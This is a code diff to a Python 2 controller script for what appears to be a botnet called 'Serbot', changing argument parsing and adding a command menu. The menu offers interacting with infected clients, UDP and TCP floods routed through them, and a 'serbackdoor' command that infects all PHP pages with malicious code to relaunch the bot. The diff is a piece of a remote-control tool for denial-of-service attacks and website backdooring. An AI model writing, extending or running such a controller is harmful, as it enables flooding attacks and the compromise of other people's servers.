@@ -1,6 +1,7 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
-import subprocess, os, sys, time, threading
+import argparse, subprocess, os, sys, time, threading
 from socket import *
 
 intro = """
@@ -56,14 +57,22 @@ class control():
 
 	def main(self):
 		print intro
+		Commands = {"accept":"Accept connections", "list":"List connections", 
+				   "clear":"Clear the console", "quit":"Close all connections and quit", 
+				   "credits":"Show Credits", "help":"Show this message",
+				   "interact":"Interact with client", "stop":"Stop interacting with client",
+				   "udpflood <ip>:<port>":"UDP flood threw client", 
+				   "tcpflood":"TCP flood threw client", 
+				   "serbackdoor":"Infects all PHP Pages with Malicious Code that will run the Serbot Client again",
+				   "rmbackdoor":"Removes the Malicious PHP Code"}
 		try:
 			s=socket(AF_INET, SOCK_STREAM)
-			s.connect((host,port))
+			s.connect((args.host,args.port))
 		except:
 			sys.exit("[ERROR] Can't connect to server")
-	
-		s.send(password)
-	
+
+		s.send(args.password)
+
 		while 1:
 			command = raw_input("> ")
 			try:
@@ -137,13 +146,16 @@ class control():
 				print "[CONTROLLER] Connection Closed"
 				s.close()
 				break
-		
+
 if __name__=="__main__":
 	parser = argparse.ArgumentParser()
+	parser.add_argument("-H", "--host", help="Host IP Address", required = True)
 	parser.add_argument("-p", "--port", type=int, help="Connection Port Number", required = True)
 	parser.add_argument("-P", "--password", type=str, help="Bridge Connection Password", required = True)
 	parser.add_argument('-v', '--version',
 						action='version',
 						version=' [+] Version: 1.0')
+						#version=' [+] %(prog)s 1.0')
 	args = parser.parse_args()
 	control().main()
+
